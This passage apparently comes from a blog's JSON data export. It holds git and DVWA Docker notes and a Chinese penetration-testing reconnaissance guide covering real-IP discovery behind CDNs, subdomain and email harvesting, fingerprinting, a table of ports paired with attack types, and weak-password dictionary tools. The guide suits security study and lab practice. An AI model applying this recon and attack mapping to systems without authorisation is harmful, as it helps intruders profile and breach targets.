<span class=\"hljs-operator\">-</span>c main<br>git remote rename origin <span class=\"hljs-keyword\">old</span><span class=\"hljs-operator\">-</span>origin<br>git remote <span class=\"hljs-keyword\">add</span> origin git<span class=\"hljs-variable\">@gitlab</span>.com:imiloo<span class=\"hljs-operator\">/</span>imiloo.gitlab.io.git<br>git <span class=\"hljs-keyword\">commit</span> <span class=\"hljs-operator\">-</span>m &quot;update blog&quot;<br>git push <span class=\"hljs-operator\">-</span>u origin <span class=\"hljs-comment\">--all</span><br>git push <span class=\"hljs-operator\">-</span>u origin <span class=\"hljs-comment\">--tags</span><br></code></pre></td></tr></table></figure>\n\n<h1 id=\"删除文件\"><a href=\"#删除文件\" class=\"headerlink\" title=\"删除文件\"></a>删除文件</h1><ol>\n<li>克隆远程仓库到本地库,例如使用ssh方法：<figure class=\"highlight crmsh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs crmsh\">git <span class=\"hljs-keyword\">clone</span> <span class=\"hljs-title\">git</span>@github.com:xxx/xxx.git<br></code></pre></td></tr></table></figure></li>\n<li>对需要删除的文件、文件夹进行如下操作:<figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stata\">git <span class=\"hljs-keyword\">rm</span> <span class=\"hljs-keyword\">test</span>.txt (删除文件)<br>git <span class=\"hljs-keyword\">rm</span> -r <span class=\"hljs-keyword\">test</span> (删除文件夹)<br></code></pre></td></tr></table></figure></li>\n<li>提交修改<figure class=\"highlight n1ql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs n1ql\">git commit -m &quot;<span class=\"hljs-keyword\">Delete</span> <span class=\"hljs-keyword\">some</span> files.<span class=\"hljs-string\">&quot;</span><br></code></pre></td></tr></table></figure></li>\n<li>将修改提交到远程仓库的xxx分支:<figure class=\"highlight maxima\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs maxima\">git <span class=\"hljs-built_in\">push</span> <span class=\"hljs-built_in\">origin</span> xxx<br></code></pre></td></tr></table></figure></li>\n</ol>\n<h1 id=\"删除远程仓库-但不删本地资源\"><a href=\"#删除远程仓库-但不删本地资源\" class=\"headerlink\" title=\"删除远程仓库 但不删本地资源\"></a>删除远程仓库 但不删本地资源</h1><p>把xxx.iml加到<code>.gitignore</code>里面忽略掉，然后提交使.gitignore生效，既:</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stylus\">git rm -r <span class=\"hljs-attr\">--cached</span> xxx<span class=\"hljs-selector-class\">.iml</span>　　<span class=\"hljs-comment\">//-r 是递归的意思   当最后面是文件夹的时候有用</span><br>git add xxx<span class=\"hljs-selector-class\">.iml</span>　　　　　 <span class=\"hljs-comment\">//若.gitignore文件中已经忽略了xxx.iml则可以不用执行此句</span><br>git commit -m <span class=\"hljs-string\">&quot;ignore xxx.xml&quot;</span><br>git push<br></code></pre></td></tr></table></figure>","site":{"data":{}},"wordcount":1512,"more":"<h1 id=\"Git-global-setup\"><a href=\"#Git-global-setup\" class=\"headerlink\" title=\"Git global setup\"></a>Git global setup</h1><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stylus\">git config <span class=\"hljs-attr\">--global</span> user<span class=\"hljs-selector-class\">.name</span> <span class=\"hljs-string\">&quot;miloo&quot;</span><br>git config <span class=\"hljs-attr\">--global</span> user<span class=\"hljs-selector-class\">.email</span> <span class=\"hljs-string\">&quot;miloo@worisur&quot;</span><br></code></pre></td></tr></table></figure>\n\n<h1 id=\"Create-a-new-repository\"><a href=\"#Create-a-new-repository\" class=\"headerlink\" title=\"Create a new repository\"></a>Create a new repository</h1><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stylus\">git clone git@gitlab<span class=\"hljs-selector-class\">.com</span>:imiloo/imiloo<span class=\"hljs-selector-class\">.gitlab</span><span class=\"hljs-selector-class\">.io</span><span class=\"hljs-selector-class\">.git</span><br>cd imiloo<span class=\"hljs-selector-class\">.gitlab</span><span class=\"hljs-selector-class\">.io</span><br>git switch -c <span class=\"hljs-selector-tag\">main</span><br>touch README<span class=\"hljs-selector-class\">.md</span><br>git add README<span class=\"hljs-selector-class\">.md</span><br>git commit -m <span class=\"hljs-string\">&quot;add README&quot;</span><br>git push -u origin main<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"Push-an-existing-folder\"><a href=\"#Push-an-existing-folder\" class=\"headerlink\" title=\"Push an existing folder\"></a>Push an existing folder</h1><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs routeros\">cd existing_folder<br>git init <span class=\"hljs-attribute\">--initial-branch</span>=main<br>git remote <span class=\"hljs-built_in\">add</span> origin git@gitlab.com:imiloo/imiloo.gitlab.io.git<br>git <span class=\"hljs-built_in\">add</span> .<br>git commit -m <span class=\"hljs-string\">&quot;Initial commit&quot;</span><br>git push -u origin main<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"Push-an-existing-Git-repository\"><a href=\"#Push-an-existing-Git-repository\" class=\"headerlink\" title=\"Push an existing Git repository\"></a>Push an existing Git repository</h1><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stylus\">cd existing_repo<br>git switch -c <span class=\"hljs-selector-tag\">main</span><br>git remote rename origin old-origin<br>git remote add origin git@gitlab<span class=\"hljs-selector-class\">.com</span>:imiloo/imiloo<span class=\"hljs-selector-class\">.gitlab</span><span class=\"hljs-selector-class\">.io</span><span class=\"hljs-selector-class\">.git</span><br>git commit -m <span class=\"hljs-string\">&quot;update blog&quot;</span><br>git push -u origin <span class=\"hljs-attr\">--all</span><br>git push -u origin <span class=\"hljs-attr\">--tags</span><br></code></pre></td></tr></table></figure>\n\n<h1 id=\"日常使用\"><a href=\"#日常使用\" class=\"headerlink\" title=\"日常使用\"></a>日常使用</h1><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\">git <span class=\"hljs-keyword\">add</span> .<br>git switch <span class=\"hljs-operator\">-</span>c main<br>git remote rename origin <span class=\"hljs-keyword\">old</span><span class=\"hljs-operator\">-</span>origin<br>git remote <span class=\"hljs-keyword\">add</span> origin git<span class=\"hljs-variable\">@github</span>.com:imiloo<span class=\"hljs-operator\">/</span>imiloo.github.io.git<br>git <span class=\"hljs-keyword\">commit</span> <span class=\"hljs-operator\">-</span>m &quot;update blog&quot;<br>git push <span class=\"hljs-operator\">-</span>u origin <span class=\"hljs-comment\">--all</span><br>git push <span class=\"hljs-operator\">-</span>u origin <span class=\"hljs-comment\">--tags</span><br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\">git <span class=\"hljs-keyword\">add</span> .<br>git switch <span class=\"hljs-operator\">-</span>c main<br>git remote rename origin <span class=\"hljs-keyword\">old</span><span class=\"hljs-operator\">-</span>origin<br>git remote <span class=\"hljs-keyword\">add</span> origin git<span class=\"hljs-variable\">@gitlab</span>.com:imiloo<span class=\"hljs-operator\">/</span>imiloo.gitlab.io.git<br>git <span class=\"hljs-keyword\">commit</span> <span class=\"hljs-operator\">-</span>m &quot;update blog&quot;<br>git push <span class=\"hljs-operator\">-</span>u origin <span class=\"hljs-comment\">--all</span><br>git push <span class=\"hljs-operator\">-</span>u origin <span class=\"hljs-comment\">--tags</span><br></code></pre></td></tr></table></figure>\n\n<h1 id=\"删除文件\"><a href=\"#删除文件\" class=\"headerlink\" title=\"删除文件\"></a>删除文件</h1><ol>\n<li>克隆远程仓库到本地库,例如使用ssh方法：<figure class=\"highlight crmsh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs crmsh\">git <span class=\"hljs-keyword\">clone</span> <span class=\"hljs-title\">git</span>@github.com:xxx/xxx.git<br></code></pre></td></tr></table></figure></li>\n<li>对需要删除的文件、文件夹进行如下操作:<figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stata\">git <span class=\"hljs-keyword\">rm</span> <span class=\"hljs-keyword\">test</span>.txt (删除文件)<br>git <span class=\"hljs-keyword\">rm</span> -r <span class=\"hljs-keyword\">test</span> (删除文件夹)<br></code></pre></td></tr></table></figure></li>\n<li>提交修改<figure class=\"highlight n1ql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs n1ql\">git commit -m &quot;<span class=\"hljs-keyword\">Delete</span> <span class=\"hljs-keyword\">some</span> files.<span class=\"hljs-string\">&quot;</span><br></code></pre></td></tr></table></figure></li>\n<li>将修改提交到远程仓库的xxx分支:<figure class=\"highlight maxima\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs maxima\">git <span class=\"hljs-built_in\">push</span> <span class=\"hljs-built_in\">origin</span> xxx<br></code></pre></td></tr></table></figure></li>\n</ol>\n<h1 id=\"删除远程仓库-但不删本地资源\"><a href=\"#删除远程仓库-但不删本地资源\" class=\"headerlink\" title=\"删除远程仓库 但不删本地资源\"></a>删除远程仓库 但不删本地资源</h1><p>把xxx.iml加到<code>.gitignore</code>里面忽略掉，然后提交使.gitignore生效，既:</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stylus\">git rm -r <span class=\"hljs-attr\">--cached</span> xxx<span class=\"hljs-selector-class\">.iml</span>　　<span class=\"hljs-comment\">//-r 是递归的意思   当最后面是文件夹的时候有用</span><br>git add xxx<span class=\"hljs-selector-class\">.iml</span>　　　　　 <span class=\"hljs-comment\">//若.gitignore文件中已经忽略了xxx.iml则可以不用执行此句</span><br>git commit -m <span class=\"hljs-string\">&quot;ignore xxx.xml&quot;</span><br>git push<br></code></pre></td></tr></table></figure>"},{"title":"docker 环境","excerpt":"dvwa ……","index_img":"/img/article-head/---.jpeg","date":"2022-08-04T12:46:25.000Z","updated":"2022-08-04T02:46:25.000Z","hide":true,"_content":"\n# dvwa\n\n```bash\ndocker pull citizenstig/dvwa\ndocker run -d -p 容器端口:宿主机端口 citizenstig/dvwa\ndocker run -d -p 80:80 citizenstig/dvwa\nhttp://192.168.110.101/login.php\n```\n\n","source":"_posts/0000-00-01.docker环境.md","raw":"---\ntitle: docker 环境\nexcerpt: dvwa ……\nindex_img: /img/article-head/---.jpeg\ndate: \"2022/8/4 20:46:25\"\nupdated: \"2022/8/4 10:46:25\"\nhide: true\ntags:\n- docker\ncategories:\n- docker\n---\n\n# dvwa\n\n```bash\ndocker pull citizenstig/dvwa\ndocker run -d -p 容器端口:宿主机端口 citizenstig/dvwa\ndocker run -d -p 80:80 citizenstig/dvwa\nhttp://192.168.110.101/login.php\n```\n\n","slug":"0000-00-01.docker环境","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"cl6nug9ax0002oqnaffoi5e90","content":"<h1 id=\"dvwa\"><a href=\"#dvwa\" class=\"headerlink\" title=\"dvwa\"></a>dvwa</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">docker pull citizenstig/dvwa<br>docker run -d -p 容器端口:宿主机端口 citizenstig/dvwa<br>docker run -d -p 80:80 citizenstig/dvwa<br>http://192.168.110.101/login.php<br></code></pre></td></tr></table></figure>\n\n","site":{"data":{}},"wordcount":139,"more":"<h1 id=\"dvwa\"><a href=\"#dvwa\" class=\"headerlink\" title=\"dvwa\"></a>dvwa</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">docker pull citizenstig/dvwa<br>docker run -d -p 容器端口:宿主机端口 citizenstig/dvwa<br>docker run -d -p 80:80 citizenstig/dvwa<br>http://192.168.110.101/login.php<br></code></pre></td></tr></table></figure>\n\n"},{"title":"信息收集","excerpt":"信息收集工具，在线网站，IP段收集，域名收集，APP收集，目录识别，指纹识别，口令收集等……","index_img":"/img/article-head/信息收集.jpeg","date":"2022-05-30T02:46:25.000Z","updated":"2022-06-16T06:46:25.000Z","hide":false,"_content":"\n- [1 IP收集](#1-ip收集)\n  - [1.1 判断目标有没有使用CDN](#11-判断目标有没有使用cdn)\n  - [1.2 查找真实IP](#12-查找真实ip)\n    - [1.2.1 大数据网络搜索平台](#121-大数据网络搜索平台)\n    - [1.2.2 历史DNS记录](#122-历史dns记录)\n    - [1.2.3 主动连接暴露的真实ip](#123-主动连接暴露的真实ip)\n    - [1.2.4 国外代理访问](#124-国外代理访问)\n    - [1.2.5 纯真ip数据库](#125-纯真ip数据库)\n  - [1.3 IP信息收集](#13-ip信息收集)\n    - [1.3.1 IP 段整理](#131-ip-段整理)\n    - [1.3.2 C段、旁站](#132-c段旁站)\n  - [1.4 搜索引擎](#14-搜索引擎)\n- [2 域名、子域名收集](#2-域名子域名收集)\n  - [2.1 域名的备案号](#21-域名的备案号)\n  - [2.2 子域名工具](#22-子域名工具)\n  - [2.3 在线子域名接口](#23-在线子域名接口)\n  - [2.4 其他泄露信息](#24-其他泄露信息)\n  - [2.5 SSL证书查询](#25-ssl证书查询)\n- [3 APP收集](#3-app收集)\n  - [3.1 app信息收集和历史版本](#31-app信息收集和历史版本)\n  - [3.2 工具](#32-工具)\n- [4 MAIL收集](#4-mail收集)\n- [5 WEB收集](#5-web收集)\n- [6 指纹识别](#6-指纹识别)\n  - [6.1 第三方网站](#61-第三方网站)\n  - [6.2 浏览器插件](#62-浏览器插件)\n  - [6.3 其他工具](#63-其他工具)\n- [7 端口识别](#7-端口识别)\n  - [7.1 常见端口](#71-常见端口)\n  - [7.2 扫描工具](#72-扫描工具)\n- [8 口令收集](#8-口令收集)\n  - [8.1 弱口令字典的生成](#81-弱口令字典的生成)\n\n# 1 IP收集\n\n## 1.1 判断目标有没有使用CDN\n\n[全球ping](https://ping.chinaz.com/)\n\n以 baidu.com 为例，全球ping结果显示如下，其中ip归属地皆为中国北京海淀 电信，但是ip地址不同，则可以确定为使用了CDN，如果结果显示ip归属地在不同地址，也可以确定为使用了CDN：\n\n监测点 | 响应IP | IP归属地 | 响应时间 | TTL | 赞助商\n| - | - | - | - | - | - |\n四川绵阳[电信] | 220.181.38.251 | 中国北京海淀 电信 | 35ms | 53ms | \n河南洛阳[多线] | 220.181.38.148 | 中国北京海淀 电信 | 23ms | 52ms | \n江苏镇江[多线] | 220.181.38.251 | 中国北京海淀 电信 | 32ms | 49ms | \n江苏镇江[电信] | 220.181.38.148 | 中国北京海淀 电信 | 27ms | 50ms | \n\n## 1.2 查找真实IP\n\n> Tips:找到真实ip，绑定host，可以打开目标网站就是真实ip\n\n### 1.2.1 大数据网络搜索平台\n\n[钟馗之眼](https://zoomeye.org/)\n\n![钟馗之眼](/img/article/信息收集/钟馗之眼.png)\n\n[censys](https://www.censys.io/)\n\n[FOFA](https://fofa.info/)\n\n![FOFA](/img/article/信息收集/fofa.png)\n\n[shodan]([shodan](https://www.shodan.io/))\n\n![shoda](/img/article/信息收集/shodan.png)\n\n### 1.2.2 历史DNS记录\n\n> 最早解析的ip地址为真实ip地址，(可能会存在使用CDN前的ip地址)\n\n[全球DNS搜索引擎](https://dnsdb.io/zh-cn)\n\n![全球DNS搜索引擎](/img/article/信息收集/全球DNS搜索引擎.png)\n\n[情报社区](https://x.threatbook.cn/)\n\n![情报社区](/img/article/信息收集/微步在线.png)\n\n[Netcraft](https://toolbar.netcraft.com/site_report?url=)\n\n![Netcraft](/img/article/信息收集/Netcraft.png)\n\n[viewdnsinfo](http://viewdns.info/)\n\n[xcdn](https://github.com/3xp10it/xcdn)\n\n[zmap](http://bobao.360.cn/learning/detail/221.html)\n\n### 1.2.3 主动连接暴露的真实ip\n\n- 注册网站邮件验证(显示邮件原文，from字段为真实ip)\n- RSS\n- 订阅网站\n\n### 1.2.4 国外代理访问\n\n国内的CDN往往只针对国内用户访问加速，有时候通过国外的DNS解析可以得到真实IP\n\n### 1.2.5 纯真ip数据库\n\n## 1.3 IP信息收集\n\n### 1.3.1 IP 段整理\n\n[CNNICIP](https://ipwhois.cnnic.net.cn/)\n\n![CNNICIP](/img/article/信息收集/ip段.png)\n\n### 1.3.2 C段、旁站\n\n[WebScan](http://www.webscan.cc/)\n\n![WebScan](/img/article/信息收集/WebScan.png)\n\n[查旁站](https://chapangzhan.com/)\n\n## 1.4 搜索引擎\n\n[google学术](https://scholar.google.com.ph/)\n\n# 2 域名、子域名收集\n\n## 2.1 域名的备案号\n\n[chinaz](icp.chinaz.com)\n\n## 2.2 子域名工具\n\n- 子域名挖掘机Layer\n- Sublist3r\n- oneforall\n\n## 2.3 在线子域名接口\n\n1. https://securitytrails.com/list/apex_domain\n2. http://ce.baidu.com/index/getRelatedSites\n3. https://dnsdumpster.com/\n4. https://findsubdomains.com/\n5. https://dnslytics.com/domain\n\n## 2.4 其他泄露信息\n\n1. crossdomain.xml文件\n2. 爬虫递归爬取\n3. DNS域传送漏洞\n\n## 2.5 SSL证书查询\n\n1. 不安全的站点，浏览器证书信息泄露\n2. dnsdumpster.com\n\n# 3 APP收集\n\n## 3.1 app信息收集和历史版本\n\n- ios：同公司的其他产品\n- android：酷安、碗豆荚等\n\n## 3.2 工具\n\n> 未加密的app会扫描出大量可注入链接\n\n- appinfoscanner\n\n![appinfoscanner](/img/article/信息收集/appinfoscanner.png)\n\n# 4 MAIL收集\n\n[email猎人在线](https://hunter.io/)\n\n![email猎人在线](/img/article/信息收集/猎人在线.png)\n\n[email-format](https://email-format.com/i/search_result/?q=)\n\n![email-format](/img/article/信息收集/email-format.png)\n\n# 5 WEB收集\n\n[FOCA](https://github.com/ElevenPaths/FOCA)\n\n# 6 指纹识别\n\n## 6.1 第三方网站\n\n[云悉](www.yunsee.cn)\n\n## 6.2 浏览器插件\n\n- wappalyzer\n\n## 6.3 其他工具\n\n- what-web\n- finger\n\n# 7 端口识别\n\n## 7.1 常见端口\n\n端口 | 服务 | 总结 | 文档\n| - | - | - | -|\n21 | FTP/TFTP/VSFTPD | 爆破/嗅探/溢出/后门 | \n22 | SSH远程连接 | 爆破/openssh漏洞 | \n23 | TELNET远程连接 | 爆破/嗅探/弱口令 | \n25 | SMTP邮件服务 | 邮件伪造 | \n53 | DNS域名解析系统 | 域传送/劫持/缓存投毒/欺骗 | \n67/68 | dhcp服务 | 劫持/欺骗 | \n110 | pop3 | 爆破/嗅探 | \n139 | samba服务 | 爆破/未授权访问/远程命令执行 | \n143 | Imap协议 | 爆破JGSNMP协议爆破/搜集目标内网信息 | \n389 | Ldap目录访问协议 | 注入/未授权访问/弱口令 | \n445 | smb | ms17-010端口溢出 | \n512/513/514 | Linux Rexec服务 | 爆破/Rlogin登陆 | \n873 | Rsyxc服务 | 文件上传/未授权访问 | \n1080 | socket | 爆破 | \n1352 | Lotus domino邮件服务 | 爆破/信息泄漏 | \n1433 | mssql | 爆破/注入/SA弱口令 | \n1521 | oracle | 爆破/注入/TNS爆破/反弹shell2O49NfS服务配置不当 | \n2181 | zookeeper服务 | 未授权访问 | \n2375 | docker remote api | 未授权访问 | \n3306 | mysql | 爆破/注入 | \n3389 | Rdp远程桌面链接 | 爆破/shfit后门 | \n4848 | GassFish控制台 | 爆破/认证绕过 | \n5000 | sybase/DB2数据库 | 爆破/注入/提权 | \n5432 | postgresql | 爆破/注入/缓冲区溢出 | \n5632 | pcanywhere服务 | 抓密码/代码执行 | \n5900 | vnc | 爆破/认证绕过 | \n6379 | Redis数据库 | 未授权访问/爆破 | \n7001/7002 | weblogic | 反序列化/控制台弱口令 | \n80/443 | http/https | web应用漏洞/心脏滴血 | \n8069 | zabbix服务 | 远程命令执行/注入 | \n8161 | activemq | 弱口令/写文件 | \n8080/8089 | Jboss/Tomcat/Resin | 爆破/PUT文件上传/反序列化 | \n8083/8086 | influxDB | 未授权访问 | \n9000 | fastcgi | 远程命令执行 | \n9090 | Websphere | 控制台爆破/java反序列化/弱口令 | \n9200/9300 | elasticsearch | 远程代码执行 | \n11211 | memcached | 未授权访问 | \n27017/27018 | mongodb | 未授权访问/爆破 | \n\n## 7.2 扫描工具\n- scanport\n- nmap\n- masscan\n- masnmapscan\n- zmap\n- 御剑高速TCP端口扫描工具\n- 御剑高速端口扫描工具\n- IISPutScanner\n- IISPutScanner增强版-DotNetScan\n\n# 8 口令收集\n\n## 8.1 弱口令字典的生成\n\n- 针对个人信息生成针对个人的密码字典\n\n[CTF密码生成器](https://www.bugku.com/mima/)\n\n- 白鹿社工字典生成器\n\n[白鹿社工字典生成器](https://github.com/x311/BaiLu-SED-Tool)\n\n\n\n","source":"_posts/2022-05-30.信息收集.md","raw":"---\ntitle: 信息收集\nexcerpt: 信息收集工具，在线网站，IP段收集，域名收集，APP收集，目录识别，指纹识别，口令收集等……\nindex_img: /img/article-head/信息收集.jpeg\ndate: \"2022/05.30 10:46:25\"\nupdated: \"2022/6/16 14:46:25\"\nhide: false\ntags:\n- Security \n- PenTest \n- 信息收集\ncategories:\n- Security \n- PenTest \n- 信息收集\n---\n\n- [1 IP收集](#1-ip收集)\n  - [1.1 判断目标有没有使用CDN](#11-判断目标有没有使用cdn)\n  - [1.2 查找真实IP](#12-查找真实ip)\n    - [1.2.1 大数据网络搜索平台](#121-大数据网络搜索平台)\n    - [1.2.2 历史DNS记录](#122-历史dns记录)\n    - [1.2.3 主动连接暴露的真实ip](#123-主动连接暴露的真实ip)\n    - [1.2.4 国外代理访问](#124-国外代理访问)\n    - [1.2.5 纯真ip数据库](#125-纯真ip数据库)\n  - [1.3 IP信息收集](#13-ip信息收集)\n    - [1.3.1 IP 段整理](#131-ip-段整理)\n    - [1.3.2 C段、旁站](#132-c段旁站)\n  - [1.4 搜索引擎](#14-搜索引擎)\n- [2 域名、子域名收集](#2-域名子域名收集)\n  - [2.1 域名的备案号](#21-域名的备案号)\n  - [2.2 子域名工具](#22-子域名工具)\n  - [2.3 在线子域名接口](#23-在线子域名接口)\n  - [2.4 其他泄露信息](#24-其他泄露信息)\n  - [2.5 SSL证书查询](#25-ssl证书查询)\n- [3 APP收集](#3-app收集)\n  - [3.1 app信息收集和历史版本](#31-app信息收集和历史版本)\n  - [3.2 工具](#32-工具)\n- [4 MAIL收集](#4-mail收集)\n- [5 WEB收集](#5-web收集)\n- [6 指纹识别](#6-指纹识别)\n  - [6.1 第三方网站](#61-第三方网站)\n  - [6.2 浏览器插件](#62-浏览器插件)\n  - [6.3 其他工具](#63-其他工具)\n- [7 端口识别](#7-端口识别)\n  - [7.1 常见端口](#71-常见端口)\n  - [7.2 扫描工具](#72-扫描工具)\n- [8 口令收集](#8-口令收集)\n  - [8.1 弱口令字典的生成](#81-弱口令字典的生成)\n\n# 1 IP收集\n\n## 1.1 判断目标有没有使用CDN\n\n[全球ping](https://ping.chinaz.com/)\n\n以 baidu.com 为例，全球ping结果显示如下，其中ip归属地皆为中国北京海淀 电信，但是ip地址不同，则可以确定为使用了CDN，如果结果显示ip归属地在不同地址，也可以确定为使用了CDN：\n\n监测点 | 响应IP | IP归属地 | 响应时间 | TTL | 赞助商\n| - | - | - | - | - | - |\n四川绵阳[电信] | 220.181.38.251 | 中国北京海淀 电信 | 35ms | 53ms | \n河南洛阳[多线] | 220.181.38.148 | 中国北京海淀 电信 | 23ms | 52ms | \n江苏镇江[多线] | 220.181.38.251 | 中国北京海淀 电信 | 32ms | 49ms | \n江苏镇江[电信] | 220.181.38.148 | 中国北京海淀 电信 | 27ms | 50ms | \n\n## 1.2 查找真实IP\n\n> Tips:找到真实ip，绑定host，可以打开目标网站就是真实ip\n\n### 1.2.1 大数据网络搜索平台\n\n[钟馗之眼](https://zoomeye.org/)\n\n![钟馗之眼](/img/article/信息收集/钟馗之眼.png)\n\n[censys](https://www.censys.io/)\n\n[FOFA](https://fofa.info/)\n\n![FOFA](/img/article/信息收集/fofa.png)\n\n[shodan]([shodan](https://www.shodan.io/))\n\n![shoda](/img/article/信息收集/shodan.png)\n\n### 1.2.2 历史DNS记录\n\n> 最早解析的ip地址为真实ip地址，(可能会存在使用CDN前的ip地址)\n\n[全球DNS搜索引擎](https://dnsdb.io/zh-cn)\n\n![全球DNS搜索引擎](/img/article/信息收集/全球DNS搜索引擎.png)\n\n[情报社区](https://x.threatbook.cn/)\n\n![情报社区](/img/article/信息收集/微步在线.png)\n\n[Netcraft](https://toolbar.netcraft.com/site_report?url=)\n\n![Netcraft](/img/article/信息收集/Netcraft.png)\n\n[viewdnsinfo](http://viewdns.info/)\n\n[xcdn](https://github.com/3xp10it/xcdn)\n\n[zmap](http://bobao.360.cn/learning/detail/221.html)\n\n### 1.2.3 主动连接暴露的真实ip\n\n- 注册网站邮件验证(显示邮件原文，from字段为真实ip)\n- RSS\n- 订阅网站\n\n### 1.2.4 国外代理访问\n\n国内的CDN往往只针对国内用户访问加速，有时候通过国外的DNS解析可以得到真实IP\n\n### 1.2.5 纯真ip数据库\n\n## 1.3 IP信息收集\n\n### 1.3.1 IP 段整理\n\n[CNNICIP](https://ipwhois.cnnic.net.cn/)\n\n![CNNICIP](/img/article/信息收集/ip段.png)\n\n### 1.3.2 C段、旁站\n\n[WebScan](http://www.webscan.cc/)\n\n![WebScan](/img/article/信息收集/WebScan.png)\n\n[查旁站](https://chapangzhan.com/)\n\n## 1.4 搜索引擎\n\n[google学术](https://scholar.google.com.ph/)\n\n# 2 域名、子域名收集\n\n## 2.1 域名的备案号\n\n[chinaz](icp.chinaz.com)\n\n## 2.2 子域名工具\n\n- 子域名挖掘机Layer\n- Sublist3r\n- oneforall\n\n## 2.3 在线子域名接口\n\n1. https://securitytrails.com/list/apex_domain\n2. http://ce.baidu.com/index/getRelatedSites\n3. https://dnsdumpster.com/\n4. https://findsubdomains.com/\n5. https://dnslytics.com/domain\n\n## 2.4 其他泄露信息\n\n1. crossdomain.xml文件\n2. 爬虫递归爬取\n3. DNS域传送漏洞\n\n## 2.5 SSL证书查询\n\n1. 不安全的站点，浏览器证书信息泄露\n2. dnsdumpster.com\n\n# 3 APP收集\n\n## 3.1 app信息收集和历史版本\n\n- ios：同公司的其他产品\n- android：酷安、碗豆荚等\n\n## 3.2 工具\n\n> 未加密的app会扫描出大量可注入链接\n\n- appinfoscanner\n\n![appinfoscanner](/img/article/信息收集/appinfoscanner.png)\n\n# 4 MAIL收集\n\n[email猎人在线](https://hunter.io/)\n\n![email猎人在线](/img/article/信息收集/猎人在线.png)\n\n[email-format](https://email-format.com/i/search_result/?q=)\n\n![email-format](/img/article/信息收集/email-format.png)\n\n# 5 WEB收集\n\n[FOCA](https://github.com/ElevenPaths/FOCA)\n\n# 6 指纹识别\n\n## 6.1 第三方网站\n\n[云悉](www.yunsee.cn)\n\n## 6.2 浏览器插件\n\n- wappalyzer\n\n## 6.3 其他工具\n\n- what-web\n- finger\n\n# 7 端口识别\n\n## 7.1 常见端口\n\n端口 | 服务 | 总结 | 文档\n| - | - | - | -|\n21 | FTP/TFTP/VSFTPD | 爆破/嗅探/溢出/后门 | \n22 | SSH远程连接 | 爆破/openssh漏洞 | \n23 | TELNET远程连接 | 爆破/嗅探/弱口令 | \n25 | SMTP邮件服务 | 邮件伪造 | \n53 | DNS域名解析系统 | 域传送/劫持/缓存投毒/欺骗 | \n67/68 | dhcp服务 | 劫持/欺骗 | \n110 | pop3 | 爆破/嗅探 | \n139 | samba服务 | 爆破/未授权访问/远程命令执行 | \n143 | Imap协议 | 爆破JGSNMP协议爆破/搜集目标内网信息 | \n389 | Ldap目录访问协议 | 注入/未授权访问/弱口令 | \n445 | smb | ms17-010端口溢出 | \n512/513/514 | Linux Rexec服务 | 爆破/Rlogin登陆 | \n873 | Rsyxc服务 | 